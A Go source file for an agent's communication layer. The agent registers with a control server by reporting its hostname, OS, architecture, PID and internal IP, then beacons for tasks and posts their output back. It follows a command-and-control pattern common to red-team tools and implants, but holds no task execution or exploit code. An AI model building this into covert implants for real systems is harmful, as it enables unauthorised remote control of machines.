package comms

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"
)

// Client handles all HTTP communication with the control server
type Client struct {
	ServerURL  string
	APIKey     string
	httpClient *http.Client
}

// RegisterRequest is sent to /api/register
type RegisterRequest struct {
	Hostname   string `json:"hostname"`
	OS         string `json:"os"`
	Arch       string `json:"arch"`
	PID        int    `json:"pid"`
	InternalIP string `json:"internal_ip"`
}

// RegisterResponse is returned from /api/register
type RegisterResponse struct {
	AgentID string `json:"agent_id"`
	APIKey  string `json:"api_key"`
}

// BeaconResponse is returned from /api/beacon
type BeaconResponse struct {
	Task *TaskPayload `json:"task"`
}

// TaskPayload represents a task from the server
type TaskPayload struct {
	ID      string      `json:"id"`
	Type    string      `json:"type"`
	Payload interface{} `json:"payload"`
}

// ResultRequest is sent to /api/result
type ResultRequest struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
	Error  string `json:"error,omitempty"`
	Status string `json:"status"`
}

// NewClient creates a new HTTP client for server communication
func NewClient(serverURL string) *Client {
	return &Client{
		ServerURL: serverURL,
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
		},
	}
}

// SetAPIKey sets the API key for authenticated requests
func (c *Client) SetAPIKey(key string) {
	c.APIKey = key
}

// Register sends registration request to the server
func (c *Client) Register(req *RegisterRequest) (*RegisterResponse, error) {
	body, err := json.Marshal(req)
	if err != nil {
		return nil, fmt.Errorf("marshal error: %w", err)
	}

	httpReq, err := http.NewRequest("POST", c.ServerURL+"/api/register", bytes.NewBuffer(body))
	if err != nil {
		return nil, fmt.Errorf("request error: %w", err)
	}
	httpReq.Header.Set("Content-Type", "application/json")

	resp, err := c.httpClient.Do(httpReq)
	if err != nil {
		return nil, fmt.Errorf("connection error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 201 {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("registration failed (HTTP %d): %s", resp.StatusCode, string(respBody))
	}

	var regResp RegisterResponse
	if err := json.NewDecoder(resp.Body).Decode(&regResp); err != nil {
		return nil, fmt.Errorf("decode error: %w", err)
	}

	return &regResp, nil
}

// Beacon sends heartbeat and retrieves next task
func (c *Client) Beacon() (*BeaconResponse, error) {
	body := []byte(`{}`)

	httpReq, err := http.NewRequest("POST", c.ServerURL+"/api/beacon", bytes.NewBuffer(body))
	if err != nil {
		return nil, fmt.Errorf("request error: %w", err)
	}
	httpReq.Header.Set("Content-Type", "application/json")
	httpReq.Header.Set("X-Agent-Key", c.APIKey)

	resp, err := c.httpClient.Do(httpReq)
	if err != nil {
		return nil, fmt.Errorf("connection error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("beacon failed (HTTP %d): %s", resp.StatusCode, string(respBody))
	}

	var beaconResp BeaconResponse
	if err := json.NewDecoder(resp.Body).Decode(&beaconResp); err != nil {
		return nil, fmt.Errorf("decode error: %w", err)
	}

	return &beaconResp, nil
}

// SendResult sends task execution results to the server
func (c *Client) SendResult(result *ResultRequest) error {
	body, err := json.Marshal(result)
	if err != nil {
		return fmt.Errorf("marshal error: %w", err)
	}

	httpReq, err := http.NewRequest("POST", c.ServerURL+"/api/result", bytes.NewBuffer(body))
	if err != nil {
		return fmt.Errorf("request error: %w", err)
	}
	httpReq.Header.Set("Content-Type", "application/json")
	httpReq.Header.Set("X-Agent-Key", c.APIKey)

	resp, err := c.httpClient.Do(httpReq)
	if err != nil {
		return fmt.Errorf("connection error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("result submission failed (HTTP %d): %s", resp.StatusCode, string(respBody))
	}

	return nil
}
